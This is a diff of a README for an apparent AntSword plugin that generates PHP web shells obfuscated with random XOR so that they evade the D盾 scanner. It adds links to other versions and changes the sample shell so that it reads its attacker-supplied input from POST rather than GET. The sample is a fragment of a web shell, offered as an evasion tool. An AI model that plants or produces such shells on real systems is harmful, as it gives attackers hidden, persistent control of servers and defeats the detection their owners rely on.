@@ -1,7 +1,14 @@
 # as_php_xor_bypass
 利用随机异或无限免杀D盾蚁剑版
 
-### 生成 SHell 样例
+
+
+PHP原版请移步:https://github.com/yzddmr6/php_xor_bypass
+
+PYTHON版请移步:https://github.com/c0ny1/WorkScripts/blob/master/php-xor-bypass/php_xor_bypass.py
+
+
+### 生成 Shell 样例
 
 ```
 <?php 
@@ -20,6 +27,6 @@ class COMI {
     }
 }
 $comi = new COMI();
-@$comi->c = $_GET['yzddmr6'];
+@$comi->c = $_POST['yzddmr6'];
 ?>
 ```
